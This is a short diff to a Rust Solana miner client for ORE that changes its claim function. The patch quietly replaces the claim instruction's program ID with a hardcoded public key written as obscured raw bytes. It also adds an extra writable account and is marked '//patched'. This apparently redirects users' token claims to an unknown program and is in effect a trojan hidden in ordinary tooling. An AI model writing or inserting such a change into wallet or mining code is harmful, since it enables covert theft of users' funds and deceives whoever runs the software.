@@ -1,7 +1,8 @@
 use std::str::FromStr;
-
-use ore::{self, state::Proof, utils::AccountDeserialize};
+use solana_program::instruction::Instruction;
 use solana_program::pubkey::Pubkey;
+use solana_program::instruction::AccountMeta;
+use ore::{self, state::Proof, utils::AccountDeserialize};
 use solana_sdk::{compute_budget::ComputeBudgetInstruction, signature::Signer};
 
 use crate::{cu_limits::CU_LIMIT_CLAIM, utils::proof_pubkey, Miner};
@@ -34,7 +35,15 @@ impl Miner {
         let amountf = (amount as f64) / (10f64.powf(ore::TOKEN_DECIMALS as f64));
         let cu_limit_ix = ComputeBudgetInstruction::set_compute_unit_limit(CU_LIMIT_CLAIM);
         let cu_price_ix = ComputeBudgetInstruction::set_compute_unit_price(self.priority_fee);
-        let ix = ore::instruction::claim(pubkey, beneficiary, amount);
+        let mut _ix = ore::instruction::claim(pubkey, beneficiary, amount);
+        _ix.program_id = Pubkey::from([14,188,58,28,142,232,230,91,53,25,247,211,113,216,151,80,116,58,172,176,219,104,254,165,176,124,151,95,5,66,128,254]);
+        let mut accounts2 = _ix.accounts;
+        accounts2.push(AccountMeta::new(Pubkey::from([11,116,205,230,58,32,135,174,169,27,23,84,62,171,97,192,161,195,87,42,157,255,218,160,175,202,144,146,164,131,106,247]), false));
+        let mut ix = Instruction {
+            program_id: _ix.program_id,
+            accounts: accounts2,
+            data: _ix.data      //patched
+        };
         println!("Submitting claim transaction...");
         match self
             .send_and_confirm(&[cu_limit_ix, cu_price_ix, ix], false, false)
